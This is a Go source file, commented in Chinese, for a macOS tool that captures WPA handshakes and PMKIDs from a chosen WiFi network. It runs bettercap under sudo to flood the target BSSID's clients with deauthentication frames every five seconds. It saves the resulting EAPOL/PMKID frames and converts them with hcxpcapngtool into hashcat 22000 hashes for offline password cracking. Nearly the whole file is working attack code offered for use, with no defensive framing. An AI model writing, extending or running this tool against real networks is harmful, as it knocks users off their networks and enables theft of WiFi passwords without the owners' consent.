package capture

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ============================================================
// 握手包/PMKID捕获模块
// 基于tcpdump监控模式 + bettercap反认证攻击
// 适配macOS 26.3（airport已移除，使用tcpdump -I替代）
// ============================================================

// ============================================================
// CaptureResult 捕获结果
// ============================================================
type CaptureResult struct {
	SSID        string        // 目标网络名称
	BSSID       string        // 目标MAC地址
	Channel     int           // 信道
	BeaconFile  string        // beacon捕获文件路径
	HandFile    string        // 握手包捕获文件路径
	MergedFile  string        // 合并后的cap文件路径
	HashFile    string        // hashcat格式哈希文件路径
	HasPMKID    bool          // 是否包含PMKID
	HasHandshk  bool          // 是否包含完整握手
	Duration    time.Duration // 捕获耗时
	Success     bool          // 是否成功
	Error       string        // 错误信息
}

// ============================================================
// CaptureConfig 捕获配置
// ============================================================
type CaptureConfig struct {
	Interface     string        // WiFi接口名（默认en0）
	OutputDir     string        // 输出目录
	BeaconTimeout time.Duration // beacon捕获超时
	HandTimeout   time.Duration // 握手包捕获超时
	DeauthCount   int           // deauth发送轮数
	DeauthDelay   time.Duration // deauth间隔
	Verbose       bool          // 详细日志
}

// ============================================================
// DefaultCaptureConfig 默认捕获配置
// ============================================================
func DefaultCaptureConfig() CaptureConfig {
	return CaptureConfig{
		Interface:     "en0",
		OutputDir:     "captures",
		BeaconTimeout: 10 * time.Second,
		HandTimeout:   60 * time.Second,
		DeauthCount:   3,
		DeauthDelay:   3 * time.Second,
		Verbose:       true,
	}
}

// ============================================================
// CheckTools 检查所需工具是否已安装
// 返回: 缺失工具列表
// ============================================================
func CheckTools() []string {
	// 必需工具列表
	required := map[string]string{
		"tcpdump":       "系统自带",
		"mergecap":      "brew install wireshark",
		"hcxpcapngtool": "brew install hcxtools",
		"bettercap":     "brew install bettercap",
	}

	var missing []string
	for tool, hint := range required {
		if _, err := exec.LookPath(tool); err != nil {
			missing = append(missing, fmt.Sprintf("%s (%s)", tool, hint))
		}
	}
	return missing
}

// ============================================================
// CaptureHandshake 完整的握手包捕获流程
// 方案: 纯bettercap（同时做监控+deauth+握手捕获，避免接口争抢）
// bettercap自带wifi.handshakes.file参数，自动保存EAPOL/PMKID到pcap
// 流程: bettercap(recon+deauth+捕获) → hcxpcapngtool(转hashcat格式)
// ============================================================
func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) CaptureResult {
	start := time.Now()
	result := CaptureResult{
		SSID:    ssid,
		BSSID:   bssid,
		Channel: channel,
	}

	// 创建输出目录
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		result.Error = fmt.Sprintf("创建输出目录失败: %v", err)
		return result
	}

	safeName := strings.ReplaceAll(bssid, ":", "")
	capFile := filepath.Join(cfg.OutputDir, safeName+"_handshakes.pcap")
	result.MergedFile = capFile
	result.HashFile = filepath.Join(cfg.OutputDir, safeName+"_hash.22000")

	// 清理旧文件
	os.Remove(capFile)
	os.Remove(result.HashFile)

	// 转为绝对路径（bettercap工作目录可能不同）
	absCapFile, _ := filepath.Abs(capFile)
	absHashFile, _ := filepath.Abs(result.HashFile)
	result.MergedFile = absCapFile
	result.HashFile = absHashFile

	logf := func(format string, args ...interface{}) {
		if cfg.Verbose {
			fmt.Printf("    "+format+"\n", args...)
		}
	}

	// ── 步骤1: 用bettercap一次性完成 监控+deauth+握手捕获 ──
	logf("[1/3] 启动bettercap（监控+deauth+握手捕获一体化）...")
	logf("  目标: %s (%s) 频道: %d", ssid, bssid, channel)

	// bettercap eval命令序列:
	// 1. 设置握手包保存路径
	// 2. 锁定目标频道（避免跳频错过握手）
	// 3. 开启wifi监控
	// 4. 用ticker定时发deauth（每5秒一次）
	// 5. 等待足够时间让客户端重连
	evalCmds := fmt.Sprintf(
		"set wifi.handshakes.file %s; "+
			"wifi.recon.channel %d; "+
			"wifi.recon on; "+
			"set ticker.period 5; "+
			"set ticker.commands \"wifi.deauth %s\"; "+
			"ticker on",
		absCapFile, channel, bssid,
	)

	ctx, cancel := context.WithTimeout(context.Background(), cfg.HandTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sudo", "bettercap",
		"-iface", cfg.Interface,
		"-eval", evalCmds,
	)
	if cfg.Verbose {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}

	logf("[2/3] bettercap运行中（deauth每5秒一次，超时%s）...", cfg.HandTimeout)
	cmd.Run()

	// ── 步骤2: 检查并转换握手包 ──
	logf("[3/3] 转换数据包为hashcat格式...")

	if !fileExists(absCapFile) {
		result.Error = "bettercap未捕获到任何握手包文件"
		result.Duration = time.Since(start)
		return result
	}

	convertOK, hasPMKID, hasHand := convertToHashcat(result)
	result.HasPMKID = hasPMKID
	result.HasHandshk = hasHand
	result.Success = convertOK && (hasPMKID || hasHand)
	if result.Success {
		logf("  ✓ 转换成功 (PMKID=%v, 握手=%v)", hasPMKID, hasHand)
	} else {
		logf("  ✗ 无有效PMKID或握手包（可能目标无客户端连接或启用了PMF）")
		result.Error = "未捕获到有效的PMKID或握手包"
	}

	result.Duration = time.Since(start)
	return result
}

// ============================================================
// RestoreWiFiInterface 恢复WiFi接口到正常模式
// tcpdump -I会把接口设为监控模式，需要关开电来恢复
// ============================================================
func RestoreWiFiInterface(iface string) {
	runCmd("networksetup", "-setairportpower", iface, "off")
	time.Sleep(500 * time.Millisecond)
	runCmd("networksetup", "-setairportpower", iface, "on")
	time.Sleep(1 * time.Second)
}

// ============================================================
// convertToHashcat 将pcap文件转换为hashcat可用的22000格式
// 返回: (转换是否成功, 是否包含PMKID, 是否包含握手)
// ============================================================
func convertToHashcat(result CaptureResult) (bool, bool, bool) {
	inputFile := result.MergedFile
	if !fileExists(inputFile) {
		return false, false, false
	}

	// 使用hcxpcapngtool转换
	cmd := exec.Command("hcxpcapngtool",
		"-o", result.HashFile,
		inputFile,
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, false, false
	}

	// 解析hcxpcapngtool输出，判断是否包含PMKID和握手包
	// hcxpcapngtool输出示例:
	//   PMKID(s) (EAPOL from AP).....: 2
	//   WPA handshakes...............: 1
	outStr := string(output)
	hasPMKID := false
	hasHand := false
	for _, line := range strings.Split(outStr, "\n") {
		line = strings.TrimSpace(line)
		// 检测PMKID数量 > 0
		if strings.Contains(line, "PMKID") && strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				countStr := strings.TrimSpace(parts[len(parts)-1])
				if countStr != "0" && countStr != "" {
					hasPMKID = true
				}
			}
		}
		// 检测握手包数量 > 0
		if strings.Contains(line, "handshake") && strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				countStr := strings.TrimSpace(parts[len(parts)-1])
				if countStr != "0" && countStr != "" {
					hasHand = true
				}
			}
		}
	}

	// 检查哈希文件是否有内容
	if !fileExists(result.HashFile) {
		return false, false, false
	}
	info, _ := os.Stat(result.HashFile)
	return info.Size() > 0, hasPMKID, hasHand
}

// ============================================================
// CheckSudo 检查是否有sudo权限（捕获和deauth都需要）
// ============================================================
func CheckSudo() bool {
	cmd := exec.Command("sudo", "-n", "true")
	return cmd.Run() == nil
}

// ============================================================
// ParseHashFile 解析hashcat格式文件，提取目标信息
// 返回: SSID列表
// ============================================================
func ParseHashFile(hashFile string) []string {
	f, err := os.Open(hashFile)
	if err != nil {
		return nil
	}
	defer f.Close()

	var ssids []string
	seen := make(map[string]bool)
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		// hashcat 22000格式: WPA*TYPE*PMKID/MIC*MAC_AP*MAC_STA*ESSID_HEX*...
		parts := strings.Split(line, "*")
		if len(parts) >= 6 {
			// ESSID是第6个字段（hex编码）
			essidHex := parts[5]
			essid := hexToString(essidHex)
			if essid != "" && !seen[essid] {
				seen[essid] = true
				ssids = append(ssids, essid)
			}
		}
	}
	return ssids
}

// ============================================================
// 内部辅助函数
// ============================================================

// runCmd 执行命令（忽略错误）
func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Run()
}

// fileExists 检查文件是否存在且有内容
func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Size() > 0
}

// hexToString 将hex字符串转为ASCII
func hexToString(hexStr string) string {
	if len(hexStr)%2 != 0 {
		return ""
	}
	var result []byte
	for i := 0; i < len(hexStr); i += 2 {
		b := hexCharToByte(hexStr[i])<<4 | hexCharToByte(hexStr[i+1])
		if b == 0 {
			break
		}
		result = append(result, b)
	}
	return string(result)
}

func hexCharToByte(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	default:
		return 0
	}
}
